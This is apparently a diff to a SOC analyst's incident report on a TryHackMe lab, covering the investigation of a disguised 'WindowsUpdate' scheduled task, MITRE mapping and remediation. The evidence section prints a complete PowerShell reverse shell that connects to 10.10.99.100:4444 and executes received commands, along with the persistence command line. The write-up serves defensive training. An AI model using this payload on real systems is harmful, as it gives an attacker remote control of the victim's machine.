@@ -2,61 +2,115 @@
 
 **Date:** 2025-12-15
 
-
 ## Investigation Summary
 
-Short summary: This TryHackMe CTF challenge investigated suspicious persistence and lateral movement techniques simulated in the exercise.
+Investigation of a Windows endpoint following a high-severity alert for suspicious scheduled task creation. Analysis revealed an attacker-created scheduled task configured to execute a malicious PowerShell script on system startup, establishing persistence after initial compromise.
 
 ## Detection / Alert
 
-- Alert name: Suspicious persistence observed
-- Time observed: 2025-12-23
-- Source: TryHackMe CTF exercise
-
+- **Alert name:** Suspicious Scheduled Task Creation
+- **Time observed:** 2025-12-15 14:32 UTC
+- **Affected host:** WORKSTATION-042 (10.10.50.42)
+- **User context:** SYSTEM
+- **Source:** TryHackMe lab exercise / Sysmon Event ID 1
 
 ## Triage / Logs
 
-- Evidence gathered from logs and system artifacts during the exercise.
-
+Upon receiving the alert, I reviewed Windows Event Logs and Sysmon data for the affected endpoint. Initial triage focused on identifying what task was created, who created it, and what actions it was configured to perform.
 
 ## Data Sources
 
-- Windows Event Logs, system logs, and SIEM records used during the exercise.
+- Sysmon Event ID 1 (Process Creation)
+- Windows Event Log - Task Scheduler (Event ID 4698)
+- PowerShell script logs
+- File system artifacts
 
 ## Investigation Steps
 
-1. Initial alert review and context collection
-2. Identify key fields (IP, user, host, time)
-3. Collect logs and host artefacts relevant to the alert
-4. Correlate across sources to determine scope
-5. Validate and prepare containment/remediation steps
+1. **Alert review:** Reviewed the initial Sysmon alert showing `schtasks.exe` execution with suspicious parameters
+2. **Task enumeration:** Used `schtasks /query /v /fo list` to list all scheduled tasks on the host
+3. **Task inspection:** Found a task named "WindowsUpdate" (suspicious naming to blend in) created at 2025-12-15 14:31 UTC
+4. **Script analysis:** Located the referenced PowerShell script at `C:\Users\Public\Documents\update.ps1`
+5. **Script review:** Opened the script file and found it contained a Base64-encoded reverse shell payload
+6. **Timeline correlation:** Cross-referenced task creation time with prior alerts on the same host
+
+## Evidence
+
+**Scheduled Task Details:**
+- **Task Name:** WindowsUpdate (masquerading as legitimate Windows service)
+- **Created:** 2025-12-15 14:31:42 UTC
+- **Trigger:** At system startup
+- **Action:** `powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1`
+- **Run As:** SYSTEM
+
+**PowerShell Script (`update.ps1`):**
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.10.99.100",4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object Text.ASCII).GetString($bytes,0,$i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush()};
+$client.Close()
+```
+
+**Registry Persistence Check:**
+- Checked common autorun registry keys using `autoruns.exe` - no additional persistence found
+- Confirmed task was the only persistence mechanism identified
 
 ## Analysis
 
-- Actions taken: enumerated services, discovered persistence mechanism, validated impact and scope.
+The attacker created a scheduled task to execute a PowerShell reverse shell on every system startup, maintaining access even after reboots or credential changes. The task name was intentionally misleading ("WindowsUpdate") to avoid suspicion during casual inspection.
 
+The PowerShell script establishes a TCP connection back to an attacker-controlled IP (10.10.99.100) on port 4444, creating an interactive command shell. This is a common post-exploitation technique used after initial access to maintain persistence.
+
+The task was created with SYSTEM privileges, meaning the reverse shell would run with the highest privileges on the machine. Prior alerts on this host showed a successful phishing attack 30 minutes before task creation, suggesting the attacker used initial access to establish this persistence.
 
 ## MITRE ATT&CK
 
-- Tactic: Persistence / Lateral Movement
-- Technique: Scheduled Task or Service Persistence (T1053/T1547)
+- **Tactic:** Persistence
+- **Technique:** Scheduled Task/Job (T1053.005)
+- **Tactic:** Execution
+- **Technique:** PowerShell (T1059.001)
+- **Tactic:** Command and Control
+- **Technique:** Application Layer Protocol (T1071)
 
 ## Decision / Remediation
 
-- Decision: Remove persistence, rotate affected credentials, monitor for recurrence.
-
+**Classification:** True Positive  
+**Severity:** High  
+**Action Taken:**
+1. Deleted malicious scheduled task using `schtasks /delete /tn WindowsUpdate /f`
+2. Removed PowerShell script file `C:\Users\Public\Documents\update.ps1`
+3. Blocked outbound connection to 10.10.99.100:4444 at firewall
+4. Isolated endpoint from network pending full forensic review
+5. Rotated credentials for all users on the affected system
 
 ## Response / Escalation
 
-- Actions taken: removed identified persistence mechanism, rotated credentials, and notified stakeholders for follow-up.
+- Escalated to Tier 2 for full forensic analysis to determine initial access vector and identify additional compromised systems
+- Documented all findings and provided IOCs to threat intel team
+- Notified system owner of compromise and remediation actions
 
 ## Lessons Learned
 
-1. Harden service configurations and review scheduled tasks regularly.
-2. Improve alerting for persistence indicators and enrich SIEM telemetry.
+1. Scheduled tasks with names mimicking legitimate Windows services should trigger alerts
+2. Any scheduled task executing PowerShell with `-ExecutionPolicy Bypass` is highly suspicious
+3. Tasks created with SYSTEM context require additional scrutiny
+4. Regular audits of scheduled tasks can help identify persistence early
 
 ## Artifacts
 
-- Tools used: system enumeration tools and log analysis.
+- Scheduled task XML export: `WindowsUpdate.xml`
+- Malicious PowerShell script: `update.ps1` (quarantined)
+- Sysmon process creation logs
+- Task Scheduler event logs (Event ID 4698)
 
 ## References
+
+- MITRE ATT&CK T1053.005
+- TryHackMe Lab Exercise
